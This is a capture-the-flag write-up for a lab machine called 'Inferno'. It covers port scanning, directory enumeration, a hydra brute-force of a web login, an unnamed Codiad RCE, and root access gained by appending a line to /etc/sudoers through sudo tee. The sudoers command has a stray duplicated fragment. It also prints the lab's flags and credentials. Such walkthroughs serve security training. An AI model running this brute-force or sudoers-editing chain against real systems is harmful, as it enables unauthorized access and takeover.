> Inferno

**export IP=10.10.207.129**

# Nmap

nmap -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
21/tcp    open     ftp?              syn-ack
22/tcp    open     ssh               syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
23/tcp    open     telnet?           syn-ack
25/tcp    open     smtp?             syn-ack
|_smtp-commands: Couldn't establish connection on port 25
26/tcp    filtered rsftp             no-response
32/tcp    filtered unknown           no-response
80/tcp    open     http              syn-ack     Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Dante's Inferno
88/tcp    open     kerberos-sec?     syn-ack
106/tcp   open     pop3pw?           syn-ack
110/tcp   open     pop3?             syn-ack
194/tcp   open     irc?              syn-ack
|_irc-info: Unable to open connection
389/tcp   open     ldap?             syn-ack
443/tcp   open     https?            syn-ack
464/tcp   open     kpasswd5?         syn-ack
522/tcp   filtered ulp               no-response
636/tcp   open     ldapssl?          syn-ack
750/tcp   open     kerberos?         syn-ack
775/tcp   open     entomb?           syn-ack
777/tcp   open     multiling-http?   syn-ack
779/tcp   open     unknown           syn-ack
783/tcp   open     spamassassin?     syn-ack
808/tcp   open     ccproxy-http?     syn-ack
873/tcp   open     rsync?            syn-ack
1001/tcp  open     webpush?          syn-ack
1130/tcp  filtered casp              no-response
1178/tcp  open     skkserv?          syn-ack
1210/tcp  open     eoss?             syn-ack
1236/tcp  open     bvcontrol?        syn-ack
1300/tcp  open     h323hostcallsc?   syn-ack
1313/tcp  open     bmc_patroldb?     syn-ack
1314/tcp  open     pdps?             syn-ack
1529/tcp  open     support?          syn-ack
2000/tcp  open     cisco-sccp?       syn-ack
2003/tcp  open     finger?           syn-ack
|_finger: ERROR: Script execution failed (use -d to debug)
2074/tcp  filtered vrtl-vmf-sa       no-response
2121/tcp  open     ccproxy-ftp?      syn-ack
2150/tcp  open     dynamic3d?        syn-ack
2188/tcp  filtered radware-rpm       no-response
2276/tcp  filtered ibridge-mgmt      no-response
2452/tcp  filtered snifferclient     no-response
2600/tcp  open     zebrasrv?         syn-ack
2601/tcp  open     zebra?            syn-ack
2602/tcp  open     ripd?             syn-ack
2603/tcp  open     ripngd?           syn-ack
2604/tcp  open     ospfd?            syn-ack
2605/tcp  open     bgpd?             syn-ack
2607/tcp  open     connection?       syn-ack
2608/tcp  open     wag-service?      syn-ack
2988/tcp  open     hippad?           syn-ack
2989/tcp  open     zarkov?           syn-ack
3447/tcp  filtered directnet         no-response
4224/tcp  open     xtell?            syn-ack
4557/tcp  open     fax?              syn-ack
4559/tcp  open     hylafax?          syn-ack
4949/tcp  open     munin?            syn-ack
5052/tcp  open     ita-manager?      syn-ack
5151/tcp  open     esri_sde?         syn-ack
5354/tcp  open     mdnsresponder?    syn-ack
5355/tcp  open     llmnr?            syn-ack
5432/tcp  open     postgresql?       syn-ack
5555/tcp  open     freeciv?          syn-ack
5666/tcp  open     nrpe?             syn-ack
5667/tcp  open     unknown           syn-ack
5674/tcp  open     hyperscsi-port?   syn-ack
5675/tcp  open     v5ua?             syn-ack
5680/tcp  open     canna?            syn-ack
5719/tcp  filtered dpm-agent         no-response
5921/tcp  filtered unknown           no-response
6346/tcp  open     gnutella?         syn-ack
6514/tcp  open     syslog-tls?       syn-ack
6566/tcp  open     sane-port?        syn-ack
6667/tcp  open     irc?              syn-ack
|_irc-info: Unable to open connection
8021/tcp  open     ftp-proxy?        syn-ack
8081/tcp  open     blackice-icecap?  syn-ack
|_mcafee-epo-agent: ePO Agent not found
8088/tcp  open     radan-http?       syn-ack
8352/tcp  filtered unknown           no-response
8398/tcp  filtered unknown           no-response
8990/tcp  open     http-wmap?        syn-ack
9098/tcp  open     unknown           syn-ack
9359/tcp  open     unknown           syn-ack
9418/tcp  open     git?              syn-ack
9673/tcp  open     unknown           syn-ack
10000/tcp open     snet-sensor-mgmt? syn-ack
10081/tcp open     famdc?            syn-ack
10082/tcp open     amandaidx?        syn-ack
10083/tcp open     amidxtape?        syn-ack
10291/tcp filtered unknown           no-response
10308/tcp filtered unknown           no-response
11201/tcp open     smsqp?            syn-ack
13937/tcp filtered unknown           no-response
15345/tcp open     xpilot?           syn-ack
15351/tcp filtered unknown           no-response
15597/tcp filtered unknown           no-response
17001/tcp open     unknown           syn-ack
17002/tcp open     unknown           syn-ack
17003/tcp open     unknown           syn-ack
17004/tcp open     unknown           syn-ack
17194/tcp filtered unknown           no-response
17350/tcp filtered unknown           no-response
18274/tcp filtered unknown           no-response
18989/tcp filtered unknown           no-response
19918/tcp filtered unknown           no-response
20011/tcp open     unknown           syn-ack
20012/tcp open     ss-idi-disc?      syn-ack
20612/tcp filtered unknown           no-response
21420/tcp filtered unknown           no-response
24554/tcp open     binkp?            syn-ack
24967/tcp filtered unknown           no-response
26383/tcp filtered unknown           no-response
27374/tcp open     subseven?         syn-ack
28458/tcp filtered unknown           no-response
28693/tcp filtered unknown           no-response
29571/tcp filtered unknown           no-response
29705/tcp filtered unknown           no-response
30374/tcp filtered unknown           no-response
30865/tcp open     unknown           syn-ack
31008/tcp filtered unknown           no-response
31696/tcp filtered unknown           no-response
34802/tcp filtered unknown           no-response
34983/tcp filtered unknown           no-response
34990/tcp filtered unknown           no-response
35666/tcp filtered unknown           no-response
35688/tcp filtered unknown           no-response
36554/tcp filtered unknown           no-response
38944/tcp filtered unknown           no-response
39863/tcp filtered unknown           no-response
40636/tcp filtered unknown           no-response
40993/tcp filtered unknown           no-response
41502/tcp filtered unknown           no-response
42348/tcp filtered unknown           no-response
43266/tcp filtered unknown           no-response
43661/tcp filtered unknown           no-response
43945/tcp filtered unknown           no-response
44935/tcp filtered unknown           no-response
45503/tcp filtered unknown           no-response
46226/tcp filtered unknown           no-response
46744/tcp filtered unknown           no-response
46873/tcp filtered unknown           no-response
51731/tcp filtered unknown           no-response
52823/tcp filtered unknown           no-response
54052/tcp filtered unknown           no-response
54368/tcp filtered unknown           no-response
55004/tcp filtered unknown           no-response
55844/tcp filtered unknown           no-response
56521/tcp filtered unknown           no-response
57000/tcp open     unknown           syn-ack
57518/tcp filtered unknown           no-response
57835/tcp filtered unknown           no-response
58043/tcp filtered unknown           no-response
58576/tcp filtered unknown           no-response
60177/tcp open     unknown           syn-ack
60179/tcp open     unknown           syn-ack
61653/tcp filtered unknown           no-response
61870/tcp filtered unknown           no-response
62941/tcp filtered unknown           no-response
63480/tcp filtered unknown           no-response
64562/tcp filtered unknown           no-response
65495/tcp filtered unknown           no-response
```

# Nikto

nikto -h http://$IP

```
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET 
+ OSVDB-3233: /icons/README: Apache default file found.
```

# Gobuster

sudo gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster/initial

```
/inferno (Status: 401)
```

When accessing `/inferno` directory, we need to authenticate ourselves. We currently have some valid usernames to bruteforce.

# user.txt

1. dante
2. inferno
3. administrator
4. admin

hydra -l users.txt -P /usr/share/wordlists/rockyou.txt -f $IP http-get /inferno -t 64

```
[80][http-get] host: 10.10.207.129   login: admin   password: dante1
```

And again we are prompted with login page. Let's use the same creds. and we currently have Codiad, a web-based IDE. Looking at the issued in Github we can find that we have RCE exploit. And we are in as www-data. Looking everywhere we got ELF files. In /Downloads we got a `.download.dat`. It full of Hex and decoding it we got creds. `dante`:`V1rg1l10h3lpm3`. We can use SSH to login as dante.

## Note: The shell crashes every 10 secconds because it kills bash shells `pkill bash`. So verytime running `/bin/sh` we can have a stable shell!

# local.txt

```
77f6f3c544ec0811e2d1243e2e0d1835
```

# Privilege Escalation

sudo -l

```
(root) NOPASSWD: /usr/bin/tee
```

Let's edit sudoers file.

echo "dante ALL=(ALL) ALL" | sudo tee -a /etc/sudoers o tee -a /etc/sudoers

sudo /bin/bash -p

We are in as root!

# proof.txt

```
f332678ed0d0767d7434b8516a7c6144
```